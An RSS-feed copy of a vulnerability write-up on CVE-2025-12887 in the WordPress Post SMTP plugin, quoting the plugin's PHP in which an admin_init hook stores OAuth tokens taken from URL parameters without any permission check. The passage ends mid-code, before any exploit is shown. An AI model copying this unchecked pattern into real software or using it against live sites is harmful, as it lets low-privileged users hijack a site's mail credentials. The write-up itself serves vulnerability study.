      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-08-cve-2025-12887/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Post SMTP&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; is vulnerable to &lt;strong&gt;authorization bypass&lt;/strong&gt; in all versions up to and including &lt;strong&gt;3.6.1&lt;/strong&gt;. The issue arises because the plugin does not properly verify whether a &lt;strong&gt;user&lt;/strong&gt; is allowed to update the &lt;strong&gt;OAuth token&lt;/strong&gt; in the &lt;strong&gt;&lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt;&lt;/strong&gt; function. This allows an &lt;strong&gt;authenticated attacker&lt;/strong&gt;, with access as low as a &lt;strong&gt;subscriber&lt;/strong&gt; role or higher, to inject &lt;strong&gt;invalid or attacker-controlled OAuth credentials&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12887&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12887&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.6.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS Severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/post-smtp/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post SMTP Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – Post SMTP&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.6.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.6.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an action hook:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin_init&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;handle_gmail_oauth_redirect&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;admin_init&lt;/code&gt; Hook&lt;/strong&gt;&#xA;This is a WordPress hook that is triggered &lt;strong&gt;every time a logged-in user accesses the admin area&lt;/strong&gt;. It runs early in the admin page initialization process, before any content is displayed.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Action registration&lt;/strong&gt;&#xA;The Post SMTP plugin registers the &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; function to the &lt;code&gt;admin_init&lt;/code&gt; hook. This means &lt;strong&gt;any logged-in user&lt;/strong&gt; (even a low-privileged user such as a &lt;em&gt;subscriber&lt;/em&gt;) can trigger this function simply by accessing an admin page.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.6.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;handle_gmail_oauth_redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;if&amp;ensp;the&amp;ensp;required&amp;ensp;OAuth&amp;ensp;parameters&amp;ensp;are&amp;ensp;present&amp;ensp;in&amp;ensp;the&amp;ensp;URL.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gmail_oauth_redirect&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Sanitize&amp;ensp;and&amp;ensp;retrieve&amp;ensp;URL&amp;ensp;parameters&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$access_token&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;access_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;access_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refresh_token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;refresh_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;refresh_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expires_in&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;expires_in&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;expires_in&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;msg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;msg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$user_email&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user_email&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user_email&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$auth_token_expires&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expires_in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$access_token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$oauth_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;access_token&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$access_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;refresh_token&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refresh_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;auth_token_expires&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$auth_token_expires&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;vendor_name&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;google&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user_email&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$user_email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span 